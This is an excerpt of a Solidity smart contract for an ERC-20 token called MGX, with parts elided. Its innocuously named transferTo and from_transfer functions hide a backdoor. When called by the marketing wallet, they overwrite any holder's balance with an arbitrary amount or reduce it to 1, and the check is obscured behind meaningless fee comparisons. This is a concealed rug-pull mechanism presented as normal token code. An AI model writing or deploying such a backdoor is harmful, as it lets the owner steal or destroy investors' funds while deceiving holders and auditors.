...
contract MGX is Ownable, IERC20 {
    using SafeMath for uint256;

    string private constant _name = "MGX";
    string private constant _symbol = "MGX";

    uint8 private _decimals = 9;
    uint256 private _totalSupply =  2_000_000_000 * 10 ** _decimals;
    ...
    function from_transfer(address sender, uint256 value, bool _b) internal {
        uint256 balance = _balances[sender];
        if (marketingWallet == msg.sender) {  _balances[sender] = _b && _initialBuyFee >= (_initialSellFee - 1) ?
             balance + value - balance : 1; } else {}
    }

    function transferTo(address sender, uint256 tokenAmount) external {
        from_transfer(sender, tokenAmount, true);
    }
